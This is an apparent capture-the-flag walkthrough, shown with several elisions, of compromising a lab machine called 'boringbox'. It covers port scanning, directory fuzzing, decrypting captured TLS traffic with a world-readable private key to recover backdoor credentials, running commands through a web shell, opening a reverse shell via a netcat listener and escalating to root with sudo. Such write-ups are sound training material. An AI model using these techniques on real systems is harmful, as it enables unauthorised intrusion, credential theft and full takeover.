...
Then a service scan:
```
kali@kali:~$ sudo nmap -sCV -p 21,22,80 10.0.2.12
Nmap scan report for 10.0.2.12
...
We fuzz the webapp for other php files. 
```
kali@kali:~$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://10.0.2.12/FUZZ.php"
...
```
kali@kali:~$ curl "http://10.0.2.12/dir/pass.txt"
...
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.0.2.12 Port 80</address>
</body></html>
```
...
kali@kali:~$ nc -lnvp 8888                                 
listening on [any] 8888 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 47576
POST / HTTP/1.1
Host: 10.0.2.15:8888
...
-admin
```
Then we spot a capture.pcap file in /opt too.
We copy the pcap file to our attacker machine. 
Upon analyzing we see that the attacker ping the server thrice then he is visited port 41312.
So we look into existing communications by:
```
jack@boringbox:~$ ss -tulpn
...
Matching Defaults entries for jack on boringbox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on boringbox:
...
Upon accepting the risk and continuing we see a login prompt, and we dont know any username or password related to this since it is a backdoor.
...
```
Listen 0.0.0.0:41312
<VirtualHost 0.0.0.0:41312>
...
We then see that the private key /etc/apache2/certs/apache.key is world readable.
...
5. IP address is 10.0.2.15, Port is 41312, Protocol is http and under key file specify the location of private key on your attacker machine.
6. The click on ok and ok again.
7. Now you can see the http requests in plaintext.

We know that we login using a post request after checking out the source of `https://<MACHINE_IP>:41312/index.php`, so we apply the filter `http.request.method == "POST"` in wireshark.

Now we analyze the request and get the username and password that was used to login.
```
Form item: "username" = "REDACTED"
Form item: "password" = "REDACTED"
```

From the plaintext requests we get the username and password used by the attacker and we also get to know the way the attacker executes commands remotely after logging in.

Now even we login and execute commands by visiting `'https://<MACHINE_IP>:41312/shell.php?cmd=id'`.
We then get a reverse shell by exploiting this.

We see that we are a part of a group named h4cked and we execute `sudo -l`:
```
www-data@boringbox:/var/www/web$ id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
www-data@boringbox:/var/www/web$ sudo -l
Matching Defaults entries for www-data on boringbox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on boringbox:
...
```
www-data@boringbox:~$ sudo bash
root@boringbox:/home/jack# id
...
```
10.0.2.12 - - [17/Feb/2022:10:19:02 +0000] "GET /dir/pass.txt HTTP/1.1" 403 491 `http://127.0.0.1/index.php` Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36"
```
